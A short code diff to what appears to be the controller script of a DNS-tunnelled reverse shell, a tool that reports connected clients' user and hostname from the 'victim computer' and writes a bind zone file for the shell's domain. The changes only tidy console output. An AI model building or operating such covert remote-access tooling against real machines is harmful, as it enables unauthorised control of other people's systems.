@@ -87,8 +87,7 @@ def getData(code, counter):
                         decoded = base64_decode_string(datastring)
                         # JSON decode
                         response = json.loads(decoded)
-                        
-                        print(response)
+                        #print(response)
                         return response
                         waitingfordata = False
 
@@ -114,8 +113,13 @@ pwd = response["pwd"]
 user = response["user"]
 hostname = response["hostname"]
 
+print("")
+print("----------------------- Client connected -----------------------")
 print(f"ID for this Reverse Shell: {code}")
-print(f"User on victim computer: {response['user']}")
+print(f"User: {user}")
+print(f"Hostname: {hostname}")
+print("----------------------------------------------------------------")
+print("")
 
 
 filename = f"../bind/data/zones/revshell.{domain}.zone"
